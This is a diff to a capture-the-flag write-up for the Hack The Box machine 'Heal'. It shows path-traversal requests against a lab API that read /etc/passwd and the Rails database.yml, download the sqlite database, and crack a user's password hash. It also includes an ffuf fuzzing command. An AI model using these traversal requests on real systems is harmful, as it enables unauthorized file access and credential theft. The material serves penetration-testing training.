@@ -84,9 +84,7 @@ curl 'http://api.heal.htb/download' -H 'Authorization: Bearer eyJhbGciOiJIUzI1Ni
 
 It is probably downloading a file, so we started to fuzz for parameter names and try for an `LFI` vulnerability. Since the webserver was very sensitive about fuzzing the application, I tried to manually enumerate the parameter of the `download` endpoint with words like `file`, `name`, `archive`, `filename`, and I've found that `filename` was the correct parameter.
 
-> If the server wasn't so sensitive about multiple requests, we could have enumerated this endpoint parameter using the command 
-> ```bash
-> ffuf -u 'http://api.heal.htb/download?FUZZ=../../../../../../../etc/passwd' -H 'Authorization: Bearer \<TOKEN\> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ic -c -t 10 -fr "no implicit conversion" -x http://127.0.0.1:8080```
+> If the server wasn't so sensitive about multiple requests, we could have enumerated this endpoint parameter using the command `ffuf -u 'http://api.heal.htb/download?FUZZ=../../../../../../../etc/passwd' -H 'Authorization: Bearer \<TOKEN\> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ic -c -t 10 -fr "no implicit conversion" -x http://127.0.0.1:8080`
 {: .prompt-info} 
 
 ```bash
@@ -98,8 +96,52 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 <SNIP>
 ```
 
-With that, we can read some files of the server. To better have some idea of important files inside the server, since we know it is running `ruby on rails`, we can spun up a `docker` instance of this service and manually enumerate the file structure
+With that, we can read some files of the server. 
 
+To have a better idea of some important files inside the server, since we know it is running `ruby on rails`, we can deploy a simple web instance of this service and manually enumerate the file structure.
+
+```bash
+rails new testapp --api -d postgresql
+```
+
+```bash
+cd testapp
+
+ls
+ .dockerignore   .gitattributes   .gitignore   .rubocop.yml    app   config      db           Gemfile        lib   public    󰂺 README.md   storage   tmp
+ .git            .github          .kamal       .ruby-version   bin   config.ru   Dockerfile   Gemfile.lock   log   Rakefile   script      test      vendor
+```
+
+```bash
+ls config
+
+ application.rb   cable.yml   credentials.yml.enc   deploy.yml       environments   locales      puma.rb     recurring.yml   storage.yml
+ boot.rb          cache.yml   database.yml          environment.rb   initializers   master.key   queue.yml   routes.rb
+```
+
+Reading the `database.yml` file, we can get some information about `sqlite` files present on the server
+
+```bash
+curl 'http://api.heal.htb/download?filename=../../config/database.yml' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0fQ.J0NnCAdf82F0IukEy8HTIUHK49VpBnwHhtd4hBp-Y_w'
+
+<SNIP>
+development:
+  <<: *default
+  database: storage/development.sqlite3
+
+test:
+  <<: *default
+  database: storage/test.sqlite3
+
+production:
+  <<: *default
+  database: storage/development.sqlite3
+<SNIP>
+```
+
+We can download the `development.sqlite3` file from the server and read it locally with `curl 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' --output ~/HTB/Medium/Heal/development.sqlite3`
+
+Enumerating the database, we can find a hash the we were able to crack using `hashcat`
 
 ```bash
 sqlite3 development.sqlite3 '.tables'
@@ -129,7 +171,7 @@ ralph:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
 
 ```
 
-With this password, we can't connect to ssh still, so we try connecting to the application instead and we are successfully logged with administrator privileges on the application
+With this password, we couldn't connect to ssh still, so we try connecting to the application instead and we are successfully logged with administrator privileges on the application
 
 ![NON](file-20250515002349947.png)
 
